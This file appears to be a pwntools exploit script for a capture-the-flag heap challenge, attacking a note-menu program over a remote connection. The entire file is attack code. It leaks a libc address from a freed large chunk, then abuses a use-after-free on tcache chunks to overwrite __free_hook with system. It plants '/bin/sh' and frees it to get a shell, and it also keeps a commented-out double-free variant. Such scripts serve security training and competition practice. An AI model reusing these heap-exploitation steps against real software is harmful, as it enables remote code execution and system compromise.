from pwn import *

r = process('./chal')
r = remote('10.113.184.121', 10058)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

def add_note(idx, len):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())

def read_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvline()

def write_note(idx, content):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Content: ')
    r.send(content)

def del_note(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

# Leak libc address
add_note(12, 0x420)
add_note(13, 0x420)
add_note(14, 0x420)
del_note(12)
del_note(13)
add_note(12, 0x420)
read_note(12)

leak_libc = u64(r.recv(8))
libc_base = leak_libc - 0x1ed0e0
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + 0x1eee48
log.success(f'Leak Libc = {hex(leak_libc)}')
log.success(f'Libc Base = {hex(libc_base)}')
log.success(f'System Address = {hex(system_addr)}')
log.success(f'Free Hook = {hex(free_hook)}')
r.recv(0x420 - 0x8)

## Use Double Free to Write system_addr to __free_hook
# for i in range(1, 0xa):
#     add_note(i, 0x10)

# for i in range(1, 0x8):
#     del_note(i)

# del_note(8)
# del_note(9)
# del_note(8)

# ### Clean tcache
# for i in range(1, 0x8):
#     add_note(i, 0x10)
# add_note(8, 0x18)
# write_note(8, p64(free_hook))
# bin_sh = u64(b'/bin/sh\x00')
# add_note(9, 0x10)
# write_note(9, p64(bin_sh))
# add_note(10, 0x10)
# add_note(11, 0x10)
# write_note(11, p64(system_addr))
# del_note(9)

## Another Way to Write system_addr to __free_hook
add_note(1, 0x18)
add_note(2, 0x18)
del_note(2)
del_note(1)
write_note(1, p64(free_hook) + p64(0) * 2)
bin_sh = u64(b'/bin/sh\x00')
write_note(2, p64(bin_sh))
add_note(3, 0x18)
add_note(4, 0x18)
write_note(4, p64(system_addr))
raw_input()
del_note(2)
r.interactive()